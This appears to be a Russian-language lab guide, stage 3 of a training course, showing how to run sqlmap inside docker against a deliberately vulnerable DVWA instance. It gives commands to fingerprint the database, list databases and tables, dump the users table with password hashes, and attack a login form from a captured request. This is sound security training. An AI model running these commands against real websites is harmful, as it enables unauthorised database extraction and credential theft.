# Этап 3 — Основы sqlmap

## Что делаем
Автоматизируем то, что нашли вручную на Этапе 2: определяем СУБД, базы, таблицы и извлекаем данные.

## Подготовка

Собрать и запустить sqlmap-контейнер (при первом запуске сборка образа займёт
1-2 минуты — клонируется официальный репозиторий sqlmap), затем зайти внутрь:
```bash
docker compose up -d --build sqlmap
docker compose exec sqlmap bash
```

Понадобится кука сессии DVWA (`PHPSESSID`) и `security=low` — их видно в DevTools (Этап 2).

## Команды

1. Определить СУБД и получить баннер:
   ```bash
   sqlmap -u "http://waf:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
     --cookie="PHPSESSID=<вставить>; security=low" \
     --banner
   ```

2. Список баз данных:
   ```bash
   sqlmap -u "http://waf:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
     --cookie="PHPSESSID=<вставить>; security=low" \
     --dbs
   ```

3. Список таблиц в базе `dvwa`:
   ```bash
   sqlmap -u "http://waf:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
     --cookie="PHPSESSID=<вставить>; security=low" \
     -D dvwa --tables
   ```

4. Дамп таблицы `users`:
   ```bash
   sqlmap -u "http://waf:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
     --cookie="PHPSESSID=<вставить>; security=low" \
     -D dvwa -T users --dump
   ```

5. Та же атака, но через POST-форму логина (файл с сырым HTTP-запросом, снятым в Burp/DevTools):
   ```bash
   sqlmap -r login-request.txt --dbs
   ```

## Ожидаемый результат
- Определена СУБД и её версия
- Получен список баз данных, таблиц, колонок
- Получен дамп таблицы `users` (логины + хэши паролей)

## Что приложить
- [ ] Вывод команды `--banner` → `screenshots/03-sqlmap-basics/banner.png`
- [ ] Вывод `--dbs` → `screenshots/03-sqlmap-basics/dbs.png`
- [ ] Вывод `--dump` таблицы users → `screenshots/03-sqlmap-basics/dump-users.png`

## Важно
Хэши паролей из дампа — **не выкладывать в открытый README/скриншоты без разбора**.
В отчёте лучше показать, что дамп получен, но сами хэши размыть/обрезать на скриншоте
(в реальном отчёте это хорошая практика — не палить чувствительные данные бездумно,
даже если это учебная лаба).
